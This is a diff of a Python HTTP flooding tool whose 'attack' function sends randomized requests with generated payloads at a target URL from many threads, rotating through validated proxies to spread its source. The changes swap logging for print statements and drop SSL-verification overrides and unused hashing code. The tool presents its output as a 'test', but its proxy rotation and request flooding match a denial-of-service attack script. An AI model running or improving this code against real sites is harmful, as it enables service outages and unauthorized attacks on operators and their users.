@@ -4,7 +4,6 @@ import requests
 import time
 import argparse
 import threading
-import logging
 import random
 import json
 from colorama import init, Fore, Style
@@ -20,17 +19,10 @@ from collections import deque
 from uuid import uuid4
 import signal
 import sys
-import ssl
 import socket
-import urllib3
-from urllib3.exceptions import InsecureRequestWarning
-from http.client import HTTPConnection, HTTPSConnection
-import hashlib  # Added for hashing
-import zlib  # Added for compression
-import hmac  # Added for HMAC
-
-# Disable SSL warnings
-urllib3.disable_warnings(InsecureRequestWarning)
+import hashlib
+import zlib
+import hmac
 
 # Initialize colorama
 init(autoreset=True)
@@ -76,10 +68,10 @@ def load_proxies(proxy_file: str):
         with open(proxy_file, "r") as f:
             proxy_list = f.read().splitlines()
         valid_proxies = [p.strip() for p in proxy_list if p.strip()]
-        logging.info(f"Loaded {len(valid_proxies)} proxies.")
+        print(f"Loaded {len(valid_proxies)} proxies.")
         return valid_proxies
     except FileNotFoundError:
-        logging.error(f"Proxy file '{proxy_file}' not found.")
+        print(f"Proxy file '{proxy_file}' not found.")
         return []
 
 def validate_proxies(proxies):
@@ -92,13 +84,13 @@ def validate_proxies(proxies):
                 if future.result():
                     validated_proxies.append(proxy)
             except Exception as e:
-                logging.error(f"Proxy validation failed for {proxy}: {e}")
-    logging.info(f"Validated {len(validated_proxies)} proxies.")
+                print(f"Proxy validation failed for {proxy}: {e}")
+    print(f"Validated {len(validated_proxies)} proxies.")
     return validated_proxies
 
 def check_proxy(proxy: str):
     try:
-        response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3, verify=False)
+        response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
         return response.status_code == 200
     except requests.RequestException:
         return False
@@ -107,10 +99,10 @@ def resolve_target(target_url: str):
     try:
         domain = target_url.split("//")[-1].split("/")[0]
         ip = resolver.resolve(domain, "A")[0].to_text()
-        logging.info(f"Resolved {domain} to IP: {ip}")
+        print(f"Resolved {domain} to IP: {ip}")
         return ip
     except Exception as e:
-        logging.error(f"Failed to resolve domain: {e}")
+        print(f"Failed to resolve domain: {e}")
         return None
 
 def check_target_reachable(ip: str):
@@ -118,7 +110,7 @@ def check_target_reachable(ip: str):
         result = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
         return result.returncode == 0
     except Exception as e:
-        logging.error(f"Ping check failed: {e}")
+        print(f"Ping check failed: {e}")
         return False
 
 def generate_payload(payload_type: str):
@@ -162,21 +154,10 @@ def attack(target_url: str, stop_event: threading.Event, pause_time: float, prox
             method = random.choice(HTTP_METHODS)
             payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
 
-            # Enhance payload with hashing, compression, or HMAC
-            if payload:
-                hashed_payload = generate_hashed_payload(payload)
-                compressed_payload = compress_payload(payload)
-                hmac_signature = generate_hmac_signature(payload, "secret_key")
-
-                # You can choose to send the hashed, compressed, or signed payload
-                # payload = hashed_payload  # Example: Send hashed payload
-                # payload = compressed_payload  # Example: Send compressed payload
-                # headers["X-HMAC-Signature"] = hmac_signature  # Example: Add HMAC signature to headers
-
             proxy = {"http": next(proxy_pool), "https": next(proxy_pool)} if proxy_pool else None
 
             response = scraper.request(
-                method, target_url, headers=headers, proxies=proxy, timeout=5, data=payload, verify=False
+                method, target_url, headers=headers, proxies=proxy, timeout=5, data=payload
             )
 
             with requests_lock:
@@ -190,7 +171,7 @@ def attack(target_url: str, stop_event: threading.Event, pause_time: float, prox
         except requests.RequestException as e:
             with requests_lock:
                 failed_requests += 1
-            logging.error(f"Request failed: {e}")
+            print(f"Request failed: {e}")
 
         time.sleep(pause_time)
 
@@ -239,17 +220,7 @@ def parse_args():
     parser.add_argument("--headers", help="Custom headers as JSON string")
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (CSV)")
-    parser.add_argument("-l", "--logfile", default="test.log", help="Log file")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
-    parser.add_argument("--ssl-verify", action="store_true", help="Enable SSL verification")
     return parser.parse_args()
-
-def setup_logging(logfile: str, verbose: bool):
-    logging.basicConfig(
-        filename=logfile,
-        level=logging.DEBUG if verbose else logging.INFO,
-        format="%(asctime)s - %(levelname)s - %(message)s",
-    )
 
 def main():
     args = parse_args()
@@ -258,7 +229,6 @@ def main():
         print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
         exit(1)
 
-    setup_logging(args.logfile, args.verbose)
     display_banner()
 
     proxies = load_proxies(args.proxies) if args.proxies else []
@@ -306,7 +276,6 @@ def main():
     with requests_lock:
         rps_stats = calculate_rps_stats()
         print(f"{GREEN}Test completed. Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | Final RPS: {rps_stats['avg']:.2f}{RESET}")
-        logging.info(f"Test finished. Total Requests Sent: {requests_sent}, Successful: {successful_requests}, Failed: {failed_requests}, Final RPS: {rps_stats['avg']:.2f}")
 
 if __name__ == "__main__":
     main()
